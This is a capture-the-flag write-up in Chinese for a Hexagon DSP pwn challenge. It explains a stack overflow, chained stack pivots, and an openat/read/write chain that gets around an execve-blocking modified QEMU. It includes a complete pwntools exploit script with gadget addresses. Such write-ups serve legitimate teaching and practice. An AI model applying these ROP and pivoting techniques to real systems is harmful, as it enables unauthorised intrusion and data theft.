# NepCTF2026 different_ROP Writeup

## 题目简述

题目给出一个静态链接的 Hexagon DSP 架构程序及配套的魔改 `qemu-hexagon`。程序菜单中的“记录校准数据”会向当前栈帧中 `fp-0x30` 的缓冲区读取 `0x40` 字节，因而覆盖保存的帧指针和返回地址。

这题的难点不只是异构 ROP。题目提供的 QEMU 会在 guest syscall 翻译前拦截 `execve`、`execveat`、`fork`、`vfork`、`clone` 和 `clone3`，所以无法用常规 `execve("/bin/sh")` 收尾，必须在 Hexagon 上完成 `openat + read + write`。

Hexagon 调用约定中，`r29` 是 SP，`r30` 是 FP，`r31` 是 LR。`allocframe` 会保存旧 FP/LR，`dealloc_return` 则恢复二者并跳回 LR，其作用近似 x86-64 的 `leave; ret`，可用于连续栈迁移。

## 解题过程

### 1. 定位溢出与调试方式

通过运行时字符串定位菜单和 `main` 后，可以看到校准分支把最多 `0x40` 字节读入 `fp-0x30`，布局如下：

```text
fp-0x30  用户缓冲区，长度 0x30
fp       保存的旧 FP
fp+0x04  保存的 LR
```

因此发送 `b"A" * 0x30 + p32(new_fp) + p32(new_lr)` 即可同时控制新栈帧和返回地址。

该架构不能直接用常见的 `gdb-multiarch` 调试。可以让 QEMU 单步记录反汇编、寄存器和系统调用：

```bash
qemu-hexagon \
  -d in_asm,exec,cpu,page,nochain \
  -singlestep \
  -dfilter 0x21590+0x100,0x21200+0xc \
  -strace \
  -D ./log \
  ./pwn
```

审计题目附带的 QEMU 还能确认沙箱并不在 guest ELF 内，而在 syscall 分发处：

```c
if (blocked_guest_syscall(num)) {
    fprintf(stderr, "[error] bad syscall\n");
    return -TARGET_EPERM;
}
```

### 2. 构造可重复的栈迁移

程序静态链接，地址固定。官方利用使用下列关键位置：

```python
read_leave_ret = 0x215B8
syscall_gadget = 0x21200
leave_ret      = 0x215F8

flag_buf = 0x4BB88
bss1 = 0x4BEA0
bss2 = bss1 + 0x38
bss3 = bss2 + 0x100
bss4 = bss3 + 0x38
bss5 = bss4 + 0x100
bss6 = bss5 + 0x38
```

第一次溢出把 FP 指到 `.bss`，把 LR 指向重新设置 `read` 参数并执行 `dealloc_return` 的片段。之后每一阶段都向新的 `.bss` 栈帧写入：

1. 下一阶段 FP；
2. syscall gadget；
3. syscall 号和 `r0`～`r2` 参数；
4. 用于再次读取下一阶段的 FP/LR。

由于 `dealloc_return` 会同时恢复 FP 和 LR，FP 也必须是合法可写地址，不能用 `0x41414141` 填充。

### 3. 完成 ORW

Hexagon Linux syscall 约定中，`r6` 保存系统调用号，`r0`、`r1`、`r2` 保存前三个参数。三段调用分别为：

```text
openat(-100, "/flag", 0)   syscall 56
read(3, flag_buf, 0x40)    syscall 63
write(1, flag_buf, 0x40)   syscall 64
```

核心 payload 如下，省略了 pwntools 的收发别名：

```python
from pwn import *

context.arch = "i386"  # 仅用于按 32 位小端打包 Hexagon 寄存器值
context.endian = "little"
io = process(["./qemu-hexagon", "./pwn"])

read_leave_ret = 0x215B8
syscall_gadget = 0x21200
leave_ret = 0x215F8
flag_buf = 0x4BB88
bss1 = 0x4BEA0
bss2 = bss1 + 0x38
bss3 = bss2 + 0x100
bss4 = bss3 + 0x38
bss5 = bss4 + 0x100
bss6 = bss5 + 0x38

io.sendlineafter(b"5. exit", b"3")
io.sendafter(b"note>", b"A" * 0x30 + p32(bss1 + 0x30) + p32(read_leave_ret))

stage_open = flat(
    bss2, syscall_gadget, 56,
    0x2222, 0x3333, 0x4444, 0, 0x6666,
    -100, bss1 + 0x28,
) + b"/flag\x00"
io.sendafter(
    b"calibration data recorded",
    stage_open.ljust(0x30, b"A")
    + p32(bss1) + p32(leave_ret)
    + p32(bss3 + 0x30) + p32(read_leave_ret),
)

stage_read = flat(
    bss4, syscall_gadget, 63,
    0x2222, 0x3333, 0x4444, 0x40, 0x6666,
    3, flag_buf,
)
io.sendafter(
    b"calibration data recorded",
    stage_read.ljust(0x30, b"A")
    + p32(bss3) + p32(leave_ret)
    + p32(bss5 + 0x30) + p32(read_leave_ret),
)

stage_write = flat(
    bss6, syscall_gadget, 64,
    0x2222, 0x3333, 0x4444, 0x40, 0x6666,
    1, flag_buf,
)
io.sendafter(
    b"calibration data recorded",
    stage_write.ljust(0x30, b"A")
    + p32(bss5) + p32(leave_ret),
)

io.interactive()
```

## 方法总结

本题把常见的栈迁移与 ORW 搬到了 Hexagon：先明确 FP、SP、LR 和 `dealloc_return` 的语义，再把每个伪造栈帧同时当作寄存器参数区和下一次迁移的跳板。

另一个关键点是审计执行环境而不只审计 guest 程序。沙箱位于魔改 QEMU 中，`execve` 路线从设计上不可行；确认这一点后，利用目标应立即改为允许 syscall 组成的 ORW。异构目标调试器支持不足时，QEMU 的单步执行日志仍能验证寄存器和控制流。
